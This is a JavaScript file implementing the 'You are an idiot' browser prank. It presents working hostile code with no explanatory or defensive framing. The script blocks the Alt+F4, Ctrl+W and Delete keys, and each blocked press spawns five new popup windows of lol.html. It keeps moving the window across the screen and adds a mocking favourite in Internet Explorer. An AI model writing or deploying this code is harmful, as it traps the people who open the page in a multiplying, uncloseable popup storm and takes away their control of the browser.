function bookmark() {
  if (navigator.userAgent.indexOf("MSIE") !== -1 || !!document.documentMode) {
    var url = "lol.html";
    var title = "Idiot!";
    window.external.AddFavorite(url, title);
  }
}

var xOff = 5;
var yOff = 5;
var xPos = 400;
var yPos = -100;
var flagRun = 1;

function changeTitle(title) {
  document.title = title;
}

function openWindow(url) {
  var features = "menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes";
  aWindow = window.open(url, "_blank", features);
}

function procreate() {
  changeTitle("Idiot!");
  for (var i = 0; i < 5; i++) {
    openWindow('lol.html');
  }
}

function altf4key(event) {
  if (event.altKey && event.keyCode == 115) {
    event.preventDefault();
    alert("You are an idiot!");
    procreate();
  }
}

function ctrlwkey(event) {
  if (event.ctrlKey && event.keyCode == 87) {
    event.preventDefault();
    alert("You are an idiot!");
    procreate();
  }
}

function delkey(event) {
  if (event.keyCode == 46) {
    event.preventDefault();
    alert("You are an idiot!");
    procreate();
  }
}

function newXlt() {
  xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
  window.focus();
}

function newXrt() {
  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
}

function newYup() {
  yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
}

function newYdn() {
  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
}

function fOff() {
  flagRun = 0;
}

function playBall() {
  xPos += xOff;
  yPos += yOff;

  if (xPos > screen.width - 357) {
    newXlt();
  }

  if (xPos < 0) {
    newXrt();
  }

  if (yPos > screen.height - 330) {
    newYup();
  }

  if (yPos < 0) {
    newYdn();
  }

  if (flagRun == 1) {
    window.moveTo(xPos, yPos);
    setTimeout(playBall, 1);
  }
}

// Event Listeners
document.addEventListener("keydown", function(event) {
  altf4key(event);
  ctrlwkey(event);
  delkey(event);
});

// Run the code
bookmark();
playBall();
